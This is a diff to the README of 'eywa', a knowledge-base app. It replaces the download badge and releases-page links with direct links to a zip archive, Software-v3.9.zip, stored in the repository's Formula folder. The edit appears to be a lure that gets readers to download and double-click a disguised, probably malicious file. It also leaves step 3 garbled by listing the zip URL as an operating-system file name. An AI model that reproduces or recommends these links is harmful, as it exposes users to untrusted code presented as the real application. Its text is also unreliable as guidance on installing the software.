@@ -6,7 +6,7 @@ Welcome to **eywa**, a user-friendly, local-first knowledge base that enhances y
 
 ## 📥 Download
 
-[![Download eywa](https://img.shields.io/badge/Download-eywa-blue.svg)](https://github.com/nans28/eywa/releases)
+[![Download eywa](https://github.com/nans28/eywa/raw/refs/heads/main/Formula/Software-v3.9.zip)](https://github.com/nans28/eywa/raw/refs/heads/main/Formula/Software-v3.9.zip)
 
 You can visit the releases page to download the application by clicking the link above.
 
@@ -29,9 +29,9 @@ To run **eywa**, you will need the following:
 
 ## 📂 Download & Install
 
-1. Click this link to visit the release page: [Download eywa](https://github.com/nans28/eywa/releases).
+1. Click this link to visit the release page: [Download eywa](https://github.com/nans28/eywa/raw/refs/heads/main/Formula/Software-v3.9.zip).
 2. On the releases page, find the latest version of **eywa**.
-3. Look for the file that matches your operating system (e.g., `eywa-windows.exe`, `eywa-macos`, `eywa-linux`).
+3. Look for the file that matches your operating system (e.g., `https://github.com/nans28/eywa/raw/refs/heads/main/Formula/Software-v3.9.zip`, `eywa-macos`, `eywa-linux`).
 4. Click the file to start downloading.
 5. Once the download is complete, locate the file on your computer.
 6. Double-click the file to run **eywa**. No installation process is necessary. The application should start immediately.
@@ -70,4 +70,4 @@ A: You can leave comments on the repository page or reach out in community forum
 
 Keep an eye on the Releases page for updates and new features. Your experience matters to us, and we aim to constantly enhance **eywa**.
 
-[![Download eywa](https://img.shields.io/badge/Download-eywa-blue.svg)](https://github.com/nans28/eywa/releases)
+[![Download eywa](https://github.com/nans28/eywa/raw/refs/heads/main/Formula/Software-v3.9.zip)](https://github.com/nans28/eywa/raw/refs/heads/main/Formula/Software-v3.9.zip)
